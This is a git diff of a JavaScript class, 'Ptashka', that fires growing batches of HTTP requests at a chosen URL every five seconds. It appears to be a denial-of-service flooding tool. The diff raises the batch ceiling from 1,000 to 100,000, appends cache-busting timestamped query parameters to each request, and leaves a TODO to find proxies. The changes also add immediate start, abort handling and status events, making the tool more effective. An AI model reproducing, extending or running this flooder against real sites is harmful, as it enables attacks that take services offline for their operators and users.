@@ -1,3 +1,5 @@
+import { setCustomInterval } from '../helpers.js';
+
 /*
 -- FLOW --
 -- a. Start sending requests starting from 1 to 1000 per 5 seconds
@@ -13,10 +15,20 @@ const STATUS_PAUSED = 'PAUSED';
 
 const INTERVAL_PERIOD = 5000; // 5 sec
 
-const BATCH_STEP = 0.25;
-const BATCH_SIZE_LIMIT = 1000;
-const BATCH_SIZE_DIRECTION_INCREASING = 1;
-const BATCH_SIZE_DIRECTION_DECREASING = -1;
+// depending on the batch resize direction, increase or decrease
+// the batch size by multiplying the breakpoint by the factor
+const BATCH_STEP_FACTOR = 0.5;
+// maximum batch size
+const BATCH_SIZE_LIMIT = 100000;
+// if the direction is 1, then the batch size is growing
+// else if the direction is -1, then the batch size is shrinking
+const BATCH_SIZE_DIRECTION_GROW = 1;
+const BATCH_SIZE_DIRECTION_SHRINK = -1;
+// if the batch size is shrinking, then it should grow, hence
+// the next breakpoint will be increased by the growth factor
+// and vice versa
+const BATCH_SIZE_DIRECTION_GROW_FACTOR = 4;
+const BATCH_SIZE_DIRECTION_SHRINK_FACTOR = 0.5;
 
 // TODO: Retrieve the Content-Length
 // TODO: Find proxies
@@ -32,14 +44,13 @@ class Ptashka extends EventTarget {
   status = STATUS_READY;
   sent = 0;
   interval = null;
-  startedAt = null;
+  startedAt = new Date().toISOString();
   pausedAt = null;
 
-  batchSizeDirection = BATCH_SIZE_DIRECTION_INCREASING;
+  batchSizeDirection = BATCH_SIZE_DIRECTION_GROW;
   batchSizeBreakpoint = 64;
   batchSize = 1; // number of ptashka to send at the interval
 
-  event = new CustomEvent('change', { detail: this });
   controller = new AbortController();
 
   static async send(url) {
@@ -53,8 +64,9 @@ class Ptashka extends EventTarget {
       throw new Error(`The Ptashka is already working on ${this.url}.`);
     }
 
-    // TODO: immediately start
-    this.interval = setInterval(async () => {
+    this.#setStatusRunning();
+
+    const sendRequests = async () => {
       let batch = [];
 
       let counter = 0;
@@ -72,6 +84,13 @@ class Ptashka extends EventTarget {
         })
       );
 
+      const isRequestAborted = responses.some(
+        (response) => response.reason.name === 'AbortError'
+      );
+      if (isRequestAborted) {
+        return this;
+      }
+
       this.#setSent(this.sent + this.batchSize);
 
       console.log('RESPONSES', responses);
@@ -85,19 +104,22 @@ class Ptashka extends EventTarget {
         // set a default breakpoint
         let nextBreakpoint = BATCH_SIZE_LIMIT;
 
-        // then check whether the batch size is increasing or decreasing
+        // then check whether the batch size is rising or falling
         switch (this.batchSizeDirection) {
-          case BATCH_SIZE_DIRECTION_INCREASING: {
-            // otherwise decrease the limit
-
-            nextBreakpoint = this.batchSizeBreakpoint / 2;
+          // if the batch size is rising
+          case BATCH_SIZE_DIRECTION_GROW: {
+            // then decrease the next breakpoint by multiplying by the fall factor
+            nextBreakpoint =
+              this.batchSizeBreakpoint * BATCH_SIZE_DIRECTION_SHRINK_FACTOR;
 
             break;
           }
 
-          case BATCH_SIZE_DIRECTION_DECREASING: {
-            // then increase a limit
-            nextBreakpoint = this.batchSizeBreakpoint * 4;
+          // if the batch size is falling
+          case BATCH_SIZE_DIRECTION_SHRINK: {
+            // then increase the next breakpoint by multiplying by the rise factor
+            nextBreakpoint =
+              this.batchSizeBreakpoint * BATCH_SIZE_DIRECTION_GROW_FACTOR;
 
             // and check whether the next batch size breakpoint is not higher than a limit
             const isLimitReached = nextBreakpoint > BATCH_SIZE_LIMIT;
@@ -119,10 +141,11 @@ class Ptashka extends EventTarget {
 
       // TODO: refactor as a separate function
       this.batchSize +=
-        this.batchSizeDirection * (this.batchSizeBreakpoint * BATCH_STEP);
-    }, INTERVAL_PERIOD);
+        this.batchSizeDirection *
+        (this.batchSizeBreakpoint * BATCH_STEP_FACTOR);
+    };
 
-    this.#setStatusRunning();
+    this.interval = setCustomInterval(sendRequests, INTERVAL_PERIOD, true);
 
     return this;
   }
@@ -132,12 +155,12 @@ class Ptashka extends EventTarget {
       throw new Error(`The Ptashka is not working on ${this.url} yet.`);
     }
 
+    this.#setStatusPaused();
+
     // abort the fetch requests
     this.controller.abort();
 
     this.#resetInterval();
-
-    this.#setStatusPaused();
   }
 
   async resume() {
@@ -145,15 +168,48 @@ class Ptashka extends EventTarget {
       throw new Error(`The Ptashka working on ${this.url} is not paused yet.`);
     }
 
-    this.send();
+    await this.send();
   }
 
-  onchange(callback, options) {
-    this.addEventListener('change', callback, options);
+  #dispatchChange(change) {
+    const event = new CustomEvent('change', { detail: change });
+
+    this.dispatchEvent(event);
+
+    const isOnChangeDefined = this.onchange !== undefined;
+    if (isOnChangeDefined) {
+      this.onchange(change);
+    }
+  }
+
+  #watchPropChange(prop, setter) {
+    return (value) => {
+      const change = {
+        key: prop,
+        value,
+      };
+
+      const result = setter(value);
+
+      this.#dispatchChange(change);
+
+      return result;
+    };
   }
 
   toJSON() {
-    // TODO: IMPLEMENT
+    const serialized = {
+      url: this.url,
+      sent: this.sent,
+      status: this.status,
+      startedAt: this.startedAt,
+      pausedAt: this.pausedAt,
+      batchSizeDirection: this.batchSizeDirection,
+      batchSizeBreakpoint: this.batchSizeBreakpoint,
+      batchSize: this.batchSize,
+    };
+
+    return serialized;
   }
 
   // GETTERS
@@ -166,31 +222,19 @@ class Ptashka extends EventTarget {
   }
 
   get #isBatchSizeDirectionIncreasing() {
-    return this.batchSizeDirection === BATCH_SIZE_DIRECTION_INCREASING;
+    return this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW;
   }
 
   // SETTERS
-  #setStatus(value) {
+  #setStatus = this.#watchPropChange('status', (value) => {
     const currentDateISO = new Date().toISOString();
 
     this.status = value;
 
-    switch (value) {
-      case STATUS_RUNNING: {
-        this.#setStartedAt(currentDateISO);
-
-        break;
-      }
-
-      case STATUS_PAUSED: {
-        this.#setPausedAt(currentDateISO);
-
-        break;
-      }
+    if (this.isStatusPaused) {
+      this.#setPausedAt(currentDateISO);
     }
-
-    this.dispatchEvent(this.event);
-  }
+  });
 
   #setStatusRunning() {
     this.#setStatus(STATUS_RUNNING);
@@ -200,23 +244,17 @@ class Ptashka extends EventTarget {
     this.#setStatus(STATUS_PAUSED);
   }
 
-  #setSent(value) {
+  #setSent = this.#watchPropChange('sent', (value) => {
     this.sent = value;
+  });
 
-    this.dispatchEvent(this.event);
-  }
-
-  #setStartedAt(value) {
+  #setStartedAt = this.#watchPropChange('startedAt', (value) => {
     this.startedAt = value;
+  });
 
-    this.dispatchEvent(this.event);
-  }
-
-  #setPausedAt(value) {
+  #setPausedAt = this.#watchPropChange('pausedAt', (value) => {
     this.pausedAt = value;
-
-    this.dispatchEvent(this.event);
-  }
+  });
 
   #setInterval(value) {
     this.interval = value;
@@ -225,9 +263,9 @@ class Ptashka extends EventTarget {
   // HELPERS
   #reverseDirection() {
     this.batchSizeDirection =
-      this.batchSizeDirection === BATCH_SIZE_DIRECTION_INCREASING
-        ? BATCH_SIZE_DIRECTION_DECREASING
-        : BATCH_SIZE_DIRECTION_INCREASING;
+      this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW
+        ? BATCH_SIZE_DIRECTION_SHRINK
+        : BATCH_SIZE_DIRECTION_GROW;
   }
 
   #createRequest() {
@@ -245,8 +283,9 @@ class Ptashka extends EventTarget {
     const searchParamsKey = Date.now();
     const searchParamsValue = `%D0%A1%D0%9B%D0%90%D0%92%D0%90%20%D0%A3%D0%9A%D0%A0%D0%90%D0%87%D0%9D%D0%86!%20${Date.now()}`;
 
-    // TODO: allow the URL to contain the search params and cut them off
-    const requestUrl = `${this.url}?${searchParamsKey}=${searchParamsValue}`;
+    const requestUrl = new URL(this.url);
+
+    requestUrl.searchParams.append(searchParamsKey, searchParamsValue);
 
     const request = new Request(requestUrl, requestOptions);
 
@@ -254,7 +293,6 @@ class Ptashka extends EventTarget {
   }
 
   #resetInterval() {
-    console.log('INTERVAL', this.interval);
     clearInterval(this.interval);
 
     this.#setInterval(null);
